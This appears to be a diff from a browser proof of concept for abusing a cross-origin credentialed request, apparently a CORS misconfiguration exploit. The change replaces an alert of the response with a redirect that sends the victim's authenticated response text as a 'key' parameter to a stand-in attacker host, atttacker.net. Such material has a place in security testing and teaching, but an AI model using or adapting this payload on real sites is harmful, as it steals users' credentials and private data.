@@ -5,5 +5,5 @@ req.withCredentials = true;
 req.send();
 
 function reqListener() {
-    alert(this.responseText)
+    location='//atttacker.net/log?key='+this.responseText;
 };
